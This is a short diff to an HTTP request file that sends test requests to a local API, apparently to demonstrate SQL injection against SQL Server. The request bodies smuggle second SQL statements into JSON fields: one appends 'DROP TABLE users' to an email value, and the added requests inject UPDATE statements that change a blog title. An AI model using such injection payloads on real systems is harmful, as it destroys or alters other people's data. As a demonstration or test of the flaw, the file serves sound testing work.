@@ -36,3 +36,19 @@ Content-Type: application/json
 {
     "email": "'trandungksnb00@gmail.com'; DROP TABLE users"
 }
+
+# Demo issues sql injection sql server
+###
+POST http://localhost:4000/blogs
+Content-Type: application/json
+
+{
+    "id": "'2'; UPDATE blogs SET title = N'Chuyển ảnh động GIF thành' WHERE id = 2"
+}
+###
+POST http://localhost:4000/blogs
+Content-Type: application/json
+
+{
+    "id": "'2'; UPDATE blogs SET title = N'Chuyển ảnh động GIF thành video' WHERE id = 2"
+}
